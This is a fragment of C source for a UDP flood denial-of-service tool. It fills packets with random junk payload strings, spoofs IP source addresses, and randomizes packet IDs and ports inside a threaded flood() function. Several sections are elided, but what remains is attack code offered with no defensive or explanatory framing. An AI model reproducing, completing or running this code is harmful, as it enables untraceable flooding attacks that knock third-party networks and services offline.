...
"¡Ë´à¡Ë´à¡Ë´à",
"09EX3",
"E1A6kzVrgYoYTEaYE7zdsfsdfsdfsdfsdfhfghfgh",
"L9TOU80W4FevgNrNhP0wertertwret",
"ËË´¡",
"4RpMre",
"lP0WSIWALUWmZwpTQnwe",
"fTSftmX4FPx",
"GUXT7IfK9CTuaLpENtisfdgdfgdfg",
"88ftW1ZbbsVSaMsUzoxEdfgdfgdfg",
"¡´àÐ",
"3lRaHR7rR1QHJHkHI3Ckasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdasdassdasd"};
...
void setup_ip_header(struct iphdr *iph)
{
 ...
 payloadz = chodos[rand()%12];
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + strlen(payloadz) - rand()% 7;
...
{
        udph->source = htons(rand()%5678);
        udph->check = 0;
       

        
 
        memcpy((void *)udph + sizeof(struct udphdr), payloadz, strlen(payloadz));
        udph->len=htons(sizeof(struct udphdr) + strlen(payloadz));
}
void *flood(void *par1)
{
        ...
        iph->saddr = (rand()%250) << 24 |
 (rand()%250) << 16 |
 (91) << 8 |
 (103);
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + strlen(payloadz) - rand()% 7;
        iph->check = csum ((signed short *) datagram, iph->tot_len);
        udph->source = htons(floodport);
